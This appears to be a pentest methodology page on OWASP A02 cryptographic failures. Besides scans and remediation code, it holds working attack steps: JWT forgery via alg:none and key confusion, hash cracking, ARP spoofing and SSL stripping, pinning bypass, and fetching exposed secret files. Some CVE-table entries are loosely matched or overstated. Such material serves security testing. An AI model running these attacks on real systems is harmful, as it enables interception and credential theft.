# A02: Cryptographic Failures

OWASP #2. Previously "Sensitive Data Exposure." Root cause focus: failures in
cryptography that lead to exposure of sensitive data or system compromise.
CWEs: CWE-259, CWE-327, CWE-331, CWE-326, CWE-916, CWE-321, CWE-319.

---

## Overview

Cryptographic failures occur when:
- Data is transmitted in cleartext (HTTP, SMTP, FTP)
- Weak or broken algorithms are used (MD5, SHA1, DES, RC4)
- Hardcoded secrets exist in code/config
- Improper key management (no rotation, weak keys, reuse)
- Missing or improper certificate validation
- Passwords stored without proper hashing

---

## Detection Methods

```bash
# TLS/SSL analysis
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for HTTP (cleartext)
curl -v http://target.com 2>&1 | grep "< HTTP"
# Check if site redirects HTTP → HTTPS

# Certificate issues
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -A2 "Signature Algorithm"

# Search code for hardcoded secrets
trufflehog git https://github.com/org/repo
gitleaks detect --source . -v
grep -rE "(password|passwd|secret|api_key|token|private_key)\s*=\s*['\"][^'\"]{5,}" .

# Check exposed config files
curl https://target.com/.env
curl https://target.com/config.php
curl https://target.com/wp-config.php.bak
```

---

## What to Look For

**Network traffic:**
- HTTP instead of HTTPS (cleartext credentials in POST)
- Mixed content (HTTPS page loading HTTP resources)
- Weak cipher suites: RC4, DES, 3DES, NULL, EXPORT ciphers
- Old TLS versions: SSLv2, SSLv3, TLS 1.0, TLS 1.1
- Self-signed or expired certificates
- Missing HSTS header

**In code/config:**
- `password = "admin123"` hardcoded
- MD5/SHA1 for password hashing: `md5($password)`, `sha1($pass.$salt)`
- ECB mode encryption
- Static IV in CBC mode
- Weak JWT secret: `secret`, `password`, `key123`
- Private keys committed to git

**In databases:**
- Plaintext passwords
- Reversible encryption for passwords
- Unsalted hashes (rainbow table vulnerable)
- Unencrypted PII/financial data at rest

**JWT weaknesses:**
- `alg: none` accepted
- Weak HS256 secret
- RSA public key used as HS256 secret

---

## Testing Methodology

### 1. TLS/SSL Testing
```bash
# Full TLS scan
testssl.sh --parallel --quiet target.com

# Check for specific weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com | grep -E "weak|WEAK|NULL|EXPORT|RC4|DES"

# Check BEAST, POODLE, ROBOT, Heartbleed
testssl.sh --vulnerable target.com

# Manual cipher check
openssl s_client -connect target.com:443 -cipher RC4-MD5 2>/dev/null
# If connection succeeds → RC4 supported (weak)

# Check certificate chain
openssl s_client -connect target.com:443 -showcerts 2>/dev/null | openssl x509 -text -noout | grep -E "Issuer|Subject|Not After|Signature"
```

### 2. Hardcoded Secret Detection
```bash
# Git history scanning
trufflehog git https://github.com/target/repo --json
gitleaks detect --source /path/to/repo -v --report-format json -o leaks.json

# Regex-based search
grep -rn --include="*.php" --include="*.py" --include="*.js" --include="*.java" \
  -E "(api_key|apikey|api_secret|password|passwd|secret|token|private_key)\s*[=:]\s*['\"][A-Za-z0-9+/]{8,}" .

# Check .env files
find . -name ".env*" -type f | xargs cat

# Check for AWS credentials
grep -rn "AKIA[0-9A-Z]{16}" .
grep -rn "aws_secret_access_key" .

# Docker images
docker history --no-trunc TARGET_IMAGE | grep -i secret
docker inspect TARGET_CONTAINER | grep -i env

# JS bundles (client-side secrets)
curl https://target.com/static/bundle.js | grep -E "api_key|apiKey|secret|token"
```

### 3. Password Hash Analysis
```bash
# Identify hash type
hash-identifier
hashid "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 = "password"

# Crack weak hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA1
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt # bcrypt (slow)
john --format=raw-md5 hashes.txt

# Check for unsalted hashes
# MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99 → known in rainbow tables
```

### 4. JWT Cryptographic Testing
```bash
# Decode JWT (no verification)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.xxx" | \
  python3 -c "import sys,base64,json; t=sys.stdin.read().strip(); parts=t.split('.'); print(json.dumps(json.loads(base64.b64decode(parts[1]+'==').decode()),indent=2))"

# Test alg:none
# Craft token with alg:none
python3 << 'EOF'
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).decode().rstrip('=')
print(f"{header}.{payload}.")
EOF

# Crack HS256 secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

# RS256 → HS256 confusion attack
# Get public key from JWKS endpoint
curl https://target.com/.well-known/jwks.json
# Use public key as HS256 secret to forge token
python3 jwt_rs256_to_hs256.py --pubkey pubkey.pem --payload '{"sub":"admin"}'
```

### 5. Exposed Sensitive Data
```bash
# Common exposed file paths
for path in .env .env.local .env.production config.php wp-config.php \
  database.yml settings.py credentials.json .git/config; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://target.com/$path"
done

# Backup files
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt

# Google dorks for exposed credentials
site:target.com filetype:env
site:target.com "DB_PASSWORD"
site:github.com "target.com" "api_key"
```

---

## Exploitation Techniques

### Cracking MD5 Passwords
```bash
# Online: crackstation.net (rainbow tables)
# Offline:
hashcat -m 0 -a 0 hash.txt rockyou.txt
hashcat -m 0 -a 3 hash.txt '?l?l?l?l?l?l?l?l'   # brute 8-char lowercase

# Common MD5 hashes to know:
# 5f4dcc3b5aa765d61d8327deb882cf99 = password
# 098f6bcd4621d373cade4e832627b4f6 = test
# d8578edf8458ce06fbc5bb76a58c5ca4 = qwerty
```

### JWT Algorithm Confusion (RS256 → HS256)
```python
import jwt, base64

# Read server's public key (from JWKS or /publickey endpoint)
with open('pubkey.pem', 'rb') as f:
    public_key = f.read()

# Forge token signed with public key as HS256 secret
payload = {"sub": "admin", "role": "admin", "iat": 9999999999}
forged = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged JWT: {forged}")
```

### Cleartext Credential Interception
```bash
# On network with Wireshark/tcpdump
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# MitM with Bettercap (LAN)
bettercap -iface eth0
# In bettercap:
net.probe on
set arp.spoof.targets TARGET_IP
arp.spoof on
net.sniff on
```

### Decrypt ECB Mode (Penguin Attack)
```python
# ECB mode: identical plaintext blocks → identical ciphertext blocks
# Detect by sending identical blocks and checking if ciphertext repeats
import requests

# Craft input with repeated blocks (16-byte AES blocks)
payload = "A" * 16 + "A" * 16  # Two identical 16-byte blocks
r = requests.post('https://target.com/encrypt', data={'input': payload})
ct = bytes.fromhex(r.json()['ciphertext'])

# Check if any 16-byte blocks repeat
blocks = [ct[i:i+16].hex() for i in range(0, len(ct), 16)]
if len(set(blocks)) < len(blocks):
    print("ECB mode detected! Identical plaintext blocks produce identical ciphertext blocks")
```

---

## Verification

```bash
# Verify TLS is enforced
curl -s -o /dev/null -w "%{redirect_url}\n" http://target.com
# Should redirect to https://

# Verify HSTS
curl -I https://target.com | grep -i strict-transport
# Should show: Strict-Transport-Security: max-age=...

# Verify password hashing
# (white-box) Check source code for bcrypt/argon2/scrypt
grep -r "bcrypt\|argon2\|scrypt\|pbkdf2" src/

# Verify no weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com | grep -v "strong"

# Verify JWT validation
curl -H "Authorization: Bearer INVALID_JWT" https://target.com/api/protected
# Must return 401, not 200
```

---

## Common Problems & Solutions

| Problem | Impact | Fix |
|---------|--------|-----|
| MD5/SHA1 passwords | Crackable in seconds | Use bcrypt/argon2/scrypt with work factor |
| Hardcoded secrets in code | Full compromise if repo exposed | Use env vars, secret managers (Vault, AWS Secrets Manager) |
| HTTP no redirect | Credential interception | 301 redirect to HTTPS + HSTS |
| Weak TLS ciphers | Downgrade/decryption attacks | Disable TLS <1.2, RC4, DES, EXPORT, NULL |
| JWT alg:none | Signature bypass | Explicitly whitelist algorithms |
| ECB mode encryption | Pattern leakage | Use AES-GCM or AES-CBC with random IV |
| Self-signed certs | MitM | Use CA-signed certs, pin certificates |
| Keys in git history | Key compromise | Rotate all exposed keys, use git-secrets pre-commit hook |

---

## Tools (with Commands)

```bash
# testssl.sh - comprehensive TLS testing
testssl.sh --parallel --vulnerable --headers --protocols target.com

# sslscan
sslscan --show-certificate target.com

# nmap SSL scripts
nmap --script ssl-heartbleed,ssl-poodle,ssl-dh-params -p 443 target.com

# Trufflehog - secret scanning
trufflehog git https://github.com/org/repo --only-verified
trufflehog filesystem /path/to/code

# Gitleaks
gitleaks detect --source . -v
gitleaks protect --staged   # pre-commit hook

# jwt_tool - JWT testing
python3 jwt_tool.py TOKEN -t                    # tamper
python3 jwt_tool.py TOKEN -X a                  # alg:none
python3 jwt_tool.py TOKEN -pk pubkey.pem -X k   # key confusion

# Hashcat
hashcat -m 0 hash.txt rockyou.txt    # MD5
hashcat -m 100 hash.txt rockyou.txt  # SHA1
hashcat -m 1800 hash.txt rockyou.txt # sha512crypt

# John the Ripper
john --format=bcrypt --wordlist=rockyou.txt hashes.txt

# SSLyze
sslyze target.com --certinfo --robot --heartbleed
```

---

## Bypass Techniques

### Certificate Pinning Bypass
```bash
# Mobile apps with cert pinning
# Use Frida to bypass:
frida -U -l ssl-pinning-bypass.js -f com.target.app

# Or use apktool + smali patching to remove pinning check
apktool d target.apk
# Find and remove X509TrustManager / CertificateException handlers
apktool b modified/ -o patched.apk
```

### HSTS Bypass
```
# HSTS only applies if user has visited before (or preloaded list)
# New victim on HTTP first visit → strip SSL (sslstrip)
sslstrip -l 10000
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
```

### Weak Entropy Exploitation
```python
# Predictable session token based on timestamp
import time, hashlib

# If token = md5(timestamp), try recent timestamps
for ts in range(int(time.time()) - 1000, int(time.time())):
    token = hashlib.md5(str(ts).encode()).hexdigest()
    # Try token against target
```

---

## Remediation

```python
# Password hashing - correct approach
import bcrypt, argon2

# bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# argon2 (preferred 2024+)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)

# Symmetric encryption - correct approach
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = os.urandom(32)        # 256-bit random key
nonce = os.urandom(12)      # 96-bit random nonce
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, aad)

# Store secrets properly
import os
SECRET_KEY = os.environ.get('SECRET_KEY')  # NOT hardcoded
```

---

## Real-World CVEs

| CVE / Incident | System | Weakness | Impact |
|---------------|--------|----------|--------|
| CVE-2014-0160 | OpenSSL Heartbleed | Memory disclosure | Private keys, passwords leaked |
| CVE-2014-3566 | SSL 3.0 POODLE | CBC padding oracle | HTTPS decryption |
| CVE-2016-0800 | OpenSSL DROWN | SSLv2 export ciphers | RSA key recovery |
| 2012 LinkedIn | LinkedIn | Unsalted SHA1 | 117M passwords cracked |
| 2013 Adobe | Adobe | 3DES ECB passwords | 153M accounts, hints in plaintext |
| 2019 Capital One | AWS SSRF | SSRF → metadata | 100M records, IAM credentials |
| 2016 Yahoo | Yahoo | MD5 passwords | 3 billion accounts cracked |
| CVE-2022-22963 | Spring Cloud | Expression injection | RCE via SpEL |
